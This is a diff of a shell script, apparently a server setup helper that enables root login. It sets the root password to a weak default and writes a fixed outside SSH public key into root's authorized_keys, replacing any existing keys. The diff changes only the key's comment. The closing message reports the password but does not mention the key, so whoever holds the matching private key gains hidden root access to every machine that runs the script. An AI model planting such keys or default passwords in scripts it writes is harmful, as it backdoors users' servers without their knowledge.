@@ -119,6 +119,6 @@ echo root:${1:-LinuxYes} | chpasswd
 
 #设置root key
 mkdir -p /root/.ssh
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7YrCqE0Pu4K5tPY+j0nCspEPJ5AuFcqT8DvfAdiiH1YogXgm57r6TuzLdKfHLVFjZzcq8PJ+ut+uJwjbnjQouRQ4fKG3BXhppuPOfnkG7mrUPgQKO2U0dreHwAlAUK8Jih019MV9EFY+Cjta+/sSVKgp1H/ouNTsvjU7ilEixP223NdwgcZKe5LMxASHfcRGU5q6aDl/zY1TFmqLhBCc2HY5T3EmeNbm4YsleRjLE8pP6195G+jzIQqFvY7iSlcjv1O+pXlMxtj+zCSe/4fVc31llu6kFuNqoDQqPBGf116mJebvEQTjotTVM7T65PQHpvKE5Iu1qptjbCNjpkcpf oui@live.com' > /root/.ssh/authorized_keys
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7YrCqE0Pu4K5tPY+j0nCspEPJ5AuFcqT8DvfAdiiH1YogXgm57r6TuzLdKfHLVFjZzcq8PJ+ut+uJwjbnjQouRQ4fKG3BXhppuPOfnkG7mrUPgQKO2U0dreHwAlAUK8Jih019MV9EFY+Cjta+/sSVKgp1H/ouNTsvjU7ilEixP223NdwgcZKe5LMxASHfcRGU5q6aDl/zY1TFmqLhBCc2HY5T3EmeNbm4YsleRjLE8pP6195G+jzIQqFvY7iSlcjv1O+pXlMxtj+zCSe/4fVc31llu6kFuNqoDQqPBGf116mJebvEQTjotTVM7T65PQHpvKE5Iu1qptjbCNjpkcpf 123456@qq.com' > /root/.ssh/authorized_keys
 
 echo -e "${GREEN}Done, root password is ${RED}${1:-LinuxYes} ${PLAIN}"
